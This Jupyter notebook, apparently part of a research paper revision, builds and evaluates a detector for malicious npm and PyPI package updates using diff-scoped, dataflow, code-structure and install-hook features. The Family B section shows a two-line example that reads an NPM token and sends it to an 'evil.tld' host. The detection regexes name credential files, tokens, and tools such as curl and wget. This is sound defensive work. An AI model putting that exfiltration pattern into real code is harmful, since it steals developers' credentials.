# Notebook 5 - Diff-Scoped and Dataflow Features
### Scientific Reports 35109da0 | fixing the features, not the evaluation

### Why the current features cannot work

After every confound was removed, the detector sat *below* a size-only baseline:

| model | PR-AUC |
|---|---|
| size proxies only | 0.687 |
| full model, size removed | 0.674 |
| PyPI subset | **0.502** (chance = 0.50) |

The reason is structural, not statistical. Every existing feature counts pattern
occurrences **across the whole archive**:

> a networking package legitimately contains 500 `axios` calls. A compromise that adds
> one exfiltration call moves the counter from 500 to 501. The feature cannot see it.

The delta features do not fix this either: `delta_net_http` is the difference of two
whole-archive totals, so ordinary refactoring drowns the signal.

### What this notebook adds

Four feature families computed on **what the update actually changed**:

| family | idea |
|---|---|
| **A. diff-scoped counts** | run the same patterns over the **added lines only** |
| **B. taint-lite dataflow** | a sensitive source and a dangerous sink co-occurring in one **added** function |
| **C. structure of added code** | import-time execution, encoded-literal density, identifier entropy, nesting |
| **D. install-hook diffs** | changes to `package.json` scripts and `setup.py` install hooks specifically |

Family B is the one that matches how these attacks actually work: read a credential,
send it somewhere. That pattern is rare in benign updates and common in compromises.

**Runtime 2-3 hours.** Checkpointed to Drive; re-run any cell to resume.

## Setup

In [ ]:
!pip install esprima -q
import os, io, re, ast, sys, math, json, time, glob, shutil, zipfile, tarfile, warnings, difflib
from collections import Counter, defaultdict
warnings.filterwarnings("ignore")
import requests, numpy as np, pandas as pd

SEED = 42
try:
    from google.colab import drive
    if not os.path.ismount("/content/drive"): drive.mount("/content/drive")
    WORK = "/content/drive/MyDrive/paper_revision"
except Exception:
    WORK = os.path.abspath("./paper_revision")
os.makedirs(WORK, exist_ok=True)
P = lambda n: os.path.join(WORK, n)

def log(m):
    line = f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    try: open(P("pipeline_log.txt"), "a").write(line + "\n")
    except Exception: pass

KEY = {"package":str,"ecosystem":str,"version_before":str,"version_after":str}

# the recency-balanced dataset from notebook 4 is preferred; fall back to v3
SRC = P("features_v4_balanced.csv")
if not os.path.exists(SRC): SRC = P("features_v3_paired.csv")
base = pd.read_csv(SRC, dtype=KEY)
base["label"] = base.label.astype(int)
log(f"source: {os.path.basename(SRC)}  {base.shape}  packages={base.package.nunique()}")
log(str(base.groupby(["ecosystem","label"]).size()))

## Registry access

Unchanged from earlier notebooks so the new rows line up with the existing ones.

In [ ]:
NPM_URL  = "https://registry.npmjs.org/{p}"
PYPI_URL = "https://pypi.org/pypi/{p}/json"
HEADERS  = {"User-Agent": "supply-chain-research/1.0 (academic)"}
DELAY, RETRIES = 0.4, 3

def _req(url, want_json, timeout):
    for a in range(RETRIES):
        try:
            r = requests.get(url, headers=HEADERS, timeout=timeout); time.sleep(DELAY)
            if r.status_code == 200: return r.json() if want_json else r.content
            if r.status_code in (429,500,502,503): time.sleep(2**a); continue
            return None
        except requests.RequestException: time.sleep(2**a)
        except ValueError: return None
    return None

fetch_npm  = lambda p: _req(NPM_URL.format(p=p), True, 15)
fetch_pypi = lambda p: _req(PYPI_URL.format(p=p), True, 15)
dl         = lambda u: _req(u, False, 30) if u else None

def tarball_url(pkg, eco, v):
    if eco == "npm":
        m = fetch_npm(pkg)
        try: return m["versions"][v]["dist"]["tarball"]
        except (KeyError, TypeError): return None
    m = fetch_pypi(pkg)
    try:
        fs = m["releases"].get(v, [])
        if not fs: return None
        sd = [f for f in fs if f["url"].endswith((".tar.gz",".zip"))]
        return (sd[0] if sd else fs[0])["url"]
    except (KeyError, TypeError): return None

def strip_root(name):
    """Drop the leading archive directory so files align across two versions."""
    parts = name.split("/", 1)
    return parts[1] if len(parts) > 1 else name

def extract_map(arch, eco):
    """{relative_path: text} - a map, not a blob, so files can be diffed pairwise."""
    if not arch: return {}
    exts = (".js",".ts",".json",".mjs",".cjs") if eco=="npm" else (".py",".cfg",".toml",".txt")
    out = {}
    try:
        try:
            with tarfile.open(fileobj=io.BytesIO(arch), mode="r:gz") as t:
                for m in t.getmembers():
                    if m.isfile() and m.name.endswith(exts) and m.size < 2_000_000:
                        f = t.extractfile(m)
                        if f: out[strip_root(m.name)] = f.read().decode("utf-8","ignore")
        except tarfile.ReadError:
            with zipfile.ZipFile(io.BytesIO(arch)) as z:
                for n in z.namelist():
                    if n.endswith(exts):
                        try: out[strip_root(n)] = z.read(n).decode("utf-8","ignore")
                        except Exception: pass
    except Exception:
        return {}
    return out

log("registry helpers ready")

## Family A - diff-scoped pattern counts

The same seven pattern families as the original paper, but counted over the **added lines
only**. Files are matched by relative path across the two archives; a file present only in
the candidate counts entirely as added.

`SequenceMatcher` is used rather than a line-set difference, so moved code is not
misreported as new.

In [ ]:
SUSPICIOUS = {
  "net_http":        re.compile(r"\b(https?://|requests\.(get|post)|urllib|fetch\(|XMLHttpRequest|http\.request|axios)", re.I),
  "subprocess_exec": re.compile(r"\b(subprocess|child_process|os\.system|exec\(|eval\(|spawn\(|popen)", re.I),
  "env_cred_access": re.compile(r"(process\.env|os\.environ|getenv|\.aws/credentials|id_rsa|\.npmrc|\.pypirc|SSH_|API_KEY|SECRET)", re.I),
  "filesystem":      re.compile(r"\b(fs\.(write|read|unlink)|open\([^)]*['\"]w|shutil|os\.remove|writeFile)", re.I),
  "encoded_blob":    re.compile(r"(base64|atob|btoa|fromCharCode|eval\(.*decode|exec\(.*decode)", re.I),
  "install_hook":    re.compile(r"(preinstall|postinstall|setup\.py|cmdclass|__import__)", re.I),
  "obfuscation":     re.compile(r"(_0x[0-9a-f]{4,}|[A-Za-z0-9+/]{120,})", re.I),
}

MAX_LINES = 20000     # guard against minified single-line bundles

def added_lines(before_txt, after_txt):
    """Lines present in the candidate but not in the predecessor, order preserved."""
    a = before_txt.splitlines()[:MAX_LINES]
    b = after_txt.splitlines()[:MAX_LINES]
    if not a: return b
    sm = difflib.SequenceMatcher(None, a, b, autojunk=False)
    out = []
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag in ("insert", "replace"):
            out.extend(b[j1:j2])
    return out

def diff_of_pair(fb, fa):
    """Return (added_text, removed_text, n_files_touched, n_files_new)."""
    added, removed, touched, new_files = [], [], 0, 0
    for path, after_txt in fa.items():
        before_txt = fb.get(path)
        if before_txt is None:
            added.extend(after_txt.splitlines()[:MAX_LINES]); new_files += 1; touched += 1
        elif before_txt != after_txt:
            added.extend(added_lines(before_txt, after_txt))
            removed.extend(added_lines(after_txt, before_txt))
            touched += 1
    return "\n".join(added), "\n".join(removed), touched, new_files

def family_A(added, removed, touched, new_files, fa):
    f = {}
    for k, rx in SUSPICIOUS.items():
        f[f"add_{k}"] = len(rx.findall(added))
        f[f"rem_{k}"] = len(rx.findall(removed))
        f[f"net_{k}"] = f[f"add_{k}"] - f[f"rem_{k}"]
    n_add = max(added.count("\n") + 1, 1)
    for k in SUSPICIOUS:
        f[f"addrate_{k}"] = round(f[f"add_{k}"] / n_add, 5)   # density within the change
    f["added_lines"]    = added.count("\n") + 1 if added else 0
    f["removed_lines"]  = removed.count("\n") + 1 if removed else 0
    f["files_touched"]  = touched
    f["files_new"]      = new_files
    f["files_total"]    = len(fa)
    f["churn_ratio"]    = round(f["added_lines"] / max(f["removed_lines"], 1), 4)
    f["touched_frac"]   = round(touched / max(len(fa), 1), 4)
    return f

log("family A ready (diff-scoped counts)")

## Family B - taint-lite dataflow

The characteristic supply-chain payload reads something sensitive and sends it somewhere:

```js
const t = process.env.NPM_TOKEN;        // source
fetch("https://evil.tld/?d=" + t);      // sink
```

Whole-archive counting sees `process.env` and `fetch` in packages that use both innocently
all the time. What matters is whether a **source and a sink appear inside the same added
function body**, and whether a value observably travels between them.

Function bodies are recovered by brace/indent scanning over the added region - deliberately
approximate, but it captures co-occurrence at a scope much tighter than the archive.

In [ ]:
SOURCES = re.compile(r"(process\.env|os\.environ|getenv|\.aws/credentials|id_rsa|"
                     r"\.npmrc|\.pypirc|SSH_|API_KEY|SECRET|TOKEN|PASSWORD|"
                     r"expanduser|homedir|hostname|platform\(\)|userInfo)", re.I)
SINKS   = re.compile(r"(https?://|fetch\(|axios|request\(|urlopen|requests\.(get|post)|"
                     r"\.send\(|socket|exec\(|spawn\(|system\(|popen|eval\()", re.I)
ENCODE  = re.compile(r"(base64|b64encode|atob|btoa|hex|fromCharCode|encodeURI|JSON\.stringify)", re.I)

def split_blocks(text, eco):
    """Approximate function/statement blocks inside the added region."""
    lines = text.splitlines()
    blocks, cur, depth = [], [], 0
    if eco == "npm":
        for ln in lines:
            cur.append(ln)
            depth += ln.count("{") - ln.count("}")
            if depth <= 0 and len(cur) > 1:
                blocks.append("\n".join(cur)); cur = []; depth = 0
        if cur: blocks.append("\n".join(cur))
    else:
        for ln in lines:
            if ln and not ln[0].isspace() and cur:
                blocks.append("\n".join(cur)); cur = []
            cur.append(ln)
        if cur: blocks.append("\n".join(cur))
    # merge tiny fragments so a two-line payload is not split apart
    merged, buf = [], ""
    for b in blocks:
        buf = (buf + "\n" + b).strip() if buf else b
        if buf.count("\n") >= 3:
            merged.append(buf); buf = ""
    if buf: merged.append(buf)
    return merged or ([text] if text else [])

def family_B(added, eco):
    blocks = split_blocks(added, eco)
    n_src = n_snk = n_both = n_chain = n_enc_flow = 0
    for b in blocks:
        s = bool(SOURCES.search(b)); k = bool(SINKS.search(b))
        n_src += s; n_snk += k
        if s and k:
            n_both += 1
            if ENCODE.search(b): n_enc_flow += 1
            # Variables that receive a sensitive value, then appear at a sink.
            # Two assignment shapes are matched: `x = process.env.T` and
            # `x = require('os').hostname()`; both are standard exfiltration openings.
            tainted = set()
            for m_ in re.finditer(
                    r"(?:const|let|var)?\s*([A-Za-z_$][\w$]{0,30})\s*=\s*([^;\n]{0,200})", b):
                name, rhs = m_.group(1), m_.group(2)
                if SOURCES.search(rhs):
                    tainted.add(name)
            # a tainted variable reaching a sink, directly or through an encoder
            hit = False
            for sm in SINKS.finditer(b):
                seg = b[sm.start(): min(len(b), sm.end() + 300)]
                for var in tainted:
                    if re.search(r"\b" + re.escape(var) + r"\b", seg):
                        hit = True; break
                if hit: break
            if hit: n_chain += 1
    nb = max(len(blocks), 1)
    return {
        "tb_blocks":        len(blocks),
        "tb_src_blocks":    n_src,
        "tb_sink_blocks":   n_snk,
        "tb_both_blocks":   n_both,          # source AND sink in one added block
        "tb_chain_blocks":  n_chain,         # value observably reaches the sink
        "tb_encoded_flow":  n_enc_flow,      # and it is encoded on the way out
        "tb_both_rate":     round(n_both / nb, 4),
        "tb_chain_rate":    round(n_chain / nb, 4),
    }

log("family B ready (taint-lite dataflow)")

## Family C - structure of the added code

Shape rather than vocabulary: code that runs at import time, dense encoded literals,
machine-generated identifiers, unusually long lines.

In [ ]:
def shannon(s):
    if not s: return 0.0
    n = len(s); return -sum((c/n)*math.log2(c/n) for c in Counter(s).values())

LONG_STR = re.compile(r"['\"][A-Za-z0-9+/=_\-]{80,}['\"]")
HEXESC   = re.compile(r"(\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4})")

def family_C(added, eco):
    lines = [l for l in added.splitlines() if l.strip()]
    n = max(len(lines), 1)
    idents = re.findall(r"[A-Za-z_$][\w$]{2,}", added)
    toplevel = 0
    for l in lines:
        if eco == "npm":
            if l and not l[0].isspace() and not l.lstrip().startswith(("//","/*","*","import","export")):
                toplevel += 1
        else:
            if l and not l[0].isspace() and not l.lstrip().startswith(("#","import","from","def ","class ")):
                toplevel += 1
    return {
        "sc_added_entropy":   round(shannon(added[:50000]), 4),
        "sc_long_strings":    len(LONG_STR.findall(added)),
        "sc_hex_escapes":     len(HEXESC.findall(added)),
        "sc_max_line_len":    max((len(l) for l in lines), default=0),
        "sc_mean_line_len":   round(sum(len(l) for l in lines)/n, 2),
        "sc_toplevel_stmts":  toplevel,                       # executes on import
        "sc_toplevel_rate":   round(toplevel/n, 4),
        "sc_ident_entropy":   round(shannon("".join(idents[:4000])), 4),
        "sc_mean_ident_len":  round(sum(map(len, idents))/max(len(idents),1), 2),
        "sc_nonascii_rate":   round(sum(ord(c) > 127 for c in added[:50000]) / max(min(len(added),50000),1), 5),
    }

log("family C ready (structure of added code)")

## Family D - install hooks and manifest changes

Install-time execution is the single most common delivery mechanism, and it lives in two
specific files. Comparing those files directly is far sharper than a global keyword count.

In [ ]:
def family_D(fb, fa, eco):
    f = {"ih_manifest_changed": 0, "ih_scripts_added": 0, "ih_install_hook_added": 0,
         "ih_deps_added": 0, "ih_setup_changed": 0, "ih_hook_has_network": 0,
         "ih_hook_has_exec": 0}
    if eco == "npm":
        pb, pa = fb.get("package.json", ""), fa.get("package.json", "")
        if pb != pa: f["ih_manifest_changed"] = 1
        try:
            jb = json.loads(pb) if pb else {}
            ja = json.loads(pa) if pa else {}
        except Exception:
            jb, ja = {}, {}
        sb, sa = (jb.get("scripts") or {}), (ja.get("scripts") or {})
        f["ih_scripts_added"] = max(len(sa) - len(sb), 0)
        for hook in ("preinstall", "install", "postinstall", "prepare"):
            if sa.get(hook) and sa.get(hook) != sb.get(hook):
                f["ih_install_hook_added"] = 1
                body = str(sa.get(hook))
                if SINKS.search(body):   f["ih_hook_has_network"] = 1
                if re.search(r"(node |curl|wget|sh -c|bash|python)", body, re.I):
                    f["ih_hook_has_exec"] = 1
        db = set((jb.get("dependencies") or {}))
        da = set((ja.get("dependencies") or {}))
        f["ih_deps_added"] = len(da - db)
    else:
        sb = "\n".join(v for k, v in fb.items() if k.endswith(("setup.py","setup.cfg","pyproject.toml")))
        sa = "\n".join(v for k, v in fa.items() if k.endswith(("setup.py","setup.cfg","pyproject.toml")))
        if sb != sa: f["ih_setup_changed"] = f["ih_manifest_changed"] = 1
        add = "\n".join(added_lines(sb, sa))
        if re.search(r"(cmdclass|install_requires|setup_requires|__import__|os\.system|subprocess)", add, re.I):
            f["ih_install_hook_added"] = 1
        if SINKS.search(add): f["ih_hook_has_network"] = 1
        if re.search(r"(exec\(|eval\(|os\.system|subprocess)", add, re.I): f["ih_hook_has_exec"] = 1
        f["ih_deps_added"] = len(re.findall(r"install_requires", add))
    return f

log("family D ready (install hooks and manifests)")

## Extraction

One pass per pair, computing all four families. Checkpointed every 25 rows.

In [ ]:
CK = P("features_v5_diff.csv")

def features_v5(pkg, eco, vb, va):
    fa = extract_map(dl(tarball_url(pkg, eco, va)), eco)
    if not fa: return None, "after_download_failed"
    fb = extract_map(dl(tarball_url(pkg, eco, vb)), eco)
    if not fb: return None, "before_download_failed"
    added, removed, touched, new_files = diff_of_pair(fb, fa)
    f = {}
    f.update(family_A(added, removed, touched, new_files, fa))
    f.update(family_B(added, eco))
    f.update(family_C(added, eco))
    f.update(family_D(fb, fa, eco))
    return f, "ok"

pairs = base[["package","ecosystem","version_before","version_after","label","origin"]].dropna(
    subset=["version_before","version_after"]).reset_index(drop=True)
log(f"pairs to process: {len(pairs)}")

prev = pd.read_csv(CK, dtype=KEY) if os.path.exists(CK) else pd.DataFrame()
done = {(str(a),str(b),str(c)) for a,b,c in
        zip(prev.package, prev.ecosystem, prev.version_after)} if len(prev) else set()
if done: log(f"resuming - {len(done)} done")

rows, st = [], Counter()
COLS = None
try:
    for n, r in enumerate(pairs.itertuples(index=False), 1):
        if (str(r.package), str(r.ecosystem), str(r.version_after)) in done:
            st["skipped"] += 1; continue
        try:
            f, s = features_v5(r.package, r.ecosystem, str(r.version_before), str(r.version_after))
            if f is None: st[s] += 1; continue
            f.update(package=r.package, ecosystem=r.ecosystem, label=int(r.label),
                     version_before=str(r.version_before), version_after=str(r.version_after),
                     origin=r.origin)
            if COLS is None: COLS = list(f.keys())
            rows.append(f); st["ok"] += 1
        except Exception as e:
            st[f"err:{type(e).__name__}"] += 1
        if n % 25 == 0:
            if rows:
                pd.DataFrame(rows).reindex(columns=COLS).to_csv(
                    CK, mode="a", header=not os.path.exists(CK), index=False)
                rows = []
            log(f"  {n}/{len(pairs)} ok={st['ok']} {dict(st)}")
except KeyboardInterrupt:
    log("interrupted - progress saved")
finally:
    if rows and COLS:
        pd.DataFrame(rows).reindex(columns=COLS).to_csv(
            CK, mode="a", header=not os.path.exists(CK), index=False)

if not os.path.exists(CK):
    raise SystemExit("No rows were extracted - check network access to the registries.")
v5 = pd.read_csv(CK, dtype=KEY).drop_duplicates(subset=["package","ecosystem","version_after"])
if "label" not in v5.columns or v5.empty:
    raise SystemExit(f"Checkpoint has no usable rows (columns: {list(v5.columns)[:8]}). "
                     f"Delete {os.path.basename(CK)} and re-run this cell.")
v5["label"] = pd.to_numeric(v5.label, errors="coerce").fillna(0).astype(int)
log(f"rows with new features: {len(v5)}")
log(str(v5.groupby(["ecosystem","label"]).size()))
log(f"breakdown: {dict(st)}")

### Sanity check on the new features

Before any model: do the dataflow features separate the classes at all? If
`tb_both_blocks` and `tb_chain_blocks` are near-identical across classes, family B has
not captured anything and the notebook should say so plainly.

In [ ]:
probe = ["add_env_cred_access","add_net_http","addrate_env_cred_access",
         "tb_both_blocks","tb_chain_blocks","tb_encoded_flow","tb_both_rate",
         "sc_toplevel_stmts","sc_long_strings","sc_hex_escapes",
         "ih_install_hook_added","ih_hook_has_network","added_lines"]
probe = [c for c in probe if c in v5.columns]
summ = v5.groupby("label")[probe].median().T
summ.columns = ["benign_median","malicious_median"]
from sklearn.metrics import roc_auc_score
summ["auc"] = [round(roc_auc_score(v5.label, v5[c]), 3) if v5[c].nunique() > 1 else 0.5
               for c in probe]
summ["|auc-0.5|"] = (summ.auc - 0.5).abs()
log("single-feature separation (AUC 0.5 = useless):")
log(str(summ.sort_values("|auc-0.5|", ascending=False).round(3).to_string()))

## Evaluation

Package-grouped CV, class weighting, three seeds - identical protocol to notebook 4 so the
comparison is like for like. The size-only baseline is reported alongside.

In [ ]:
from sklearn.model_selection import StratifiedGroupKFold
from sklearn.ensemble import HistGradientBoostingClassifier
from sklearn.metrics import (f1_score, confusion_matrix, average_precision_score,
                             roc_auc_score, precision_score, recall_score)

d = v5.reset_index(drop=True)
y, g = d.label.values, d.package.values
SEEDS = (42, 7, 123)

A = [c for c in d.columns if c.startswith(("add_","rem_","net_","addrate_"))]
B = [c for c in d.columns if c.startswith("tb_")]
C = [c for c in d.columns if c.startswith("sc_")]
D = [c for c in d.columns if c.startswith("ih_")]
SIZEP = [c for c in ["added_lines","removed_lines","files_touched","files_new",
                     "files_total","churn_ratio","touched_frac"] if c in d.columns]
log(f"A={len(A)} B={len(B)} C={len(C)} D={len(D)} size-proxies={len(SIZEP)}")

def run(cols, name, results=None):
    X = d[cols].fillna(0).values
    f1s, prs, rocs, fprs = [], [], [], []
    oof_last = None
    for s in SEEDS:
        oof = np.zeros(len(X))
        for tr, te in StratifiedGroupKFold(5, shuffle=True, random_state=s).split(X, y, g):
            pos = y[tr].sum()
            w = np.where(y[tr]==1, (len(tr)-pos)/max(pos,1), 1.0)
            m = HistGradientBoostingClassifier(max_iter=300, random_state=s)
            m.fit(X[tr], y[tr], sample_weight=w)
            oof[te] = m.predict_proba(X[te])[:,1]
        pred = (oof>=0.5).astype(int)
        tn,fp,fn,tp = confusion_matrix(y,pred,labels=[0,1]).ravel()
        f1s.append(f1_score(y,pred,zero_division=0)); prs.append(average_precision_score(y,oof))
        rocs.append(roc_auc_score(y,oof)); fprs.append(fp/(fp+tn) if fp+tn else 0.0)
        oof_last = oof
    r = {"f1":round(float(np.mean(f1s)),4), "f1_sd":round(float(np.std(f1s)),4),
         "pr_auc":round(float(np.mean(prs)),4), "roc_auc":round(float(np.mean(rocs)),4),
         "fpr":round(float(np.mean(fprs)),4), "n_features":len(cols)}
    log(f"  {name:32s} F1={r['f1']:.3f}+/-{r['f1_sd']:.3f}  PR-AUC={r['pr_auc']:.3f}  "
        f"ROC-AUC={r['roc_auc']:.3f}  FPR={r['fpr']:.3f}")
    if results is not None: results[name] = r
    return r, oof_last

R5 = {}
log(f"prevalence = {y.mean():.3f}  (chance PR-AUC)")
log("--- baselines ---")
r_size, _ = run(SIZEP, "change-size only", R5)

log("--- new families, one at a time ---")
run(A, "A: diff-scoped counts", R5)
run(B, "B: taint-lite dataflow", R5)
run(C, "C: structure of added code", R5)
run(D, "D: install hooks", R5)

log("--- combined ---")
r_all, oof = run(A+B+C+D, "A+B+C+D", R5)
r_nosz, _  = run([c for c in A+B+C+D if c not in SIZEP], "A+B+C+D (size-free)", R5)

gain = r_all["pr_auc"] - r_size["pr_auc"]
log("="*78)
log(f"best model vs change-size baseline : {gain:+.4f} PR-AUC")
log(f"notebook 4 reference               : -0.0138 PR-AUC (old features)")
log("="*78)
R5["verdict"] = {"over_size_pr_auc": round(gain,4), "prevalence": round(float(y.mean()),4)}
if gain > 0.05:
    log("VERDICT: the diff-scoped features find what whole-archive counts could not.")
elif gain > 0.02:
    log("VERDICT: a real but modest improvement over the size baseline.")
else:
    log("VERDICT: still not separable with static textual evidence.")

### Per-ecosystem, operating points, and what actually mattered

In [ ]:
for e in ["npm","pypi"]:
    msk = (d.ecosystem==e).values
    if msk.sum() > 20 and len(set(y[msk])) > 1:
        pr = (oof[msk]>=0.5).astype(int)
        tn,fp,fn,tp = confusion_matrix(y[msk],pr,labels=[0,1]).ravel()
        log(f"  {e:5s} n={msk.sum():4d} F1={f1_score(y[msk],pr,zero_division=0):.3f} "
            f"Rec={tp/max(tp+fn,1):.3f} FPR={fp/max(fp+tn,1):.3f} "
            f"PR-AUC={average_precision_score(y[msk],oof[msk]):.3f} "
            f"(chance {y[msk].mean():.3f})")
        R5.setdefault("per_ecosystem",{})[e] = {
            "n":int(msk.sum()),
            "pr_auc":round(float(average_precision_score(y[msk],oof[msk])),4),
            "chance":round(float(y[msk].mean()),4)}

ops = []
for tgt in [0.01,0.05,0.10,0.20]:
    for th in np.unique(oof):
        tn,fp,fn,tp = confusion_matrix(y,(oof>=th).astype(int),labels=[0,1]).ravel()
        if fp+tn and fp/(fp+tn) <= tgt:
            ops.append({"target_fpr":tgt,"achieved_fpr":round(float(fp/(fp+tn)),4),
                        "recall":round(float(tp/max(tp+fn,1)),4),
                        "precision":round(float(tp/max(tp+fp,1)),4)}); break
log("operating points:"); [log(f"    {o}") for o in ops]
R5["operating_points"] = ops

from sklearn.inspection import permutation_importance
Xa = d[A+B+C+D].fillna(0)
m = HistGradientBoostingClassifier(max_iter=300, random_state=SEED).fit(Xa, y)
pi = permutation_importance(m, Xa, y, n_repeats=5, random_state=SEED, scoring="average_precision")
imp = pd.DataFrame({"feature": Xa.columns, "importance": pi.importances_mean}) \
        .sort_values("importance", ascending=False).head(15)
log("top features:"); log(str(imp.round(4).to_string(index=False)))
R5["top_features"] = imp.head(15).to_dict("records")

R5["dataset"] = {"n":int(len(d)), "packages":int(d.package.nunique()),
                 "by_eco_label":{f"{a}_{b}":int(c) for (a,b),c in
                                 d.groupby(["ecosystem","label"]).size().items()}}
json.dump(R5, open(P("revision_results_v5.json"),"w"), indent=2, default=str)
log("saved revision_results_v5.json")

---
## Reading the result

```
best model vs change-size baseline : +X.XXXX PR-AUC
```

* **above +0.05** - the diff-scoped view works. The detector framing is defensible and the
  paper has a real contribution: whole-archive counting was the wrong unit of analysis.
* **+0.02 to +0.05** - a genuine but modest gain; worth reporting honestly, weak as a
  headline claim.
* **near zero** - static textual evidence is not sufficient for this task, however it is
  scoped. That is itself a finding, and the remaining option is learned code
  representations or dynamic analysis.

Also watch the single-feature AUC table: if `tb_chain_blocks` separates the classes,
the dataflow idea is sound even when the aggregate model is unimpressive.

Send back `revision_results_v5.json` and `features_v5_diff.csv`.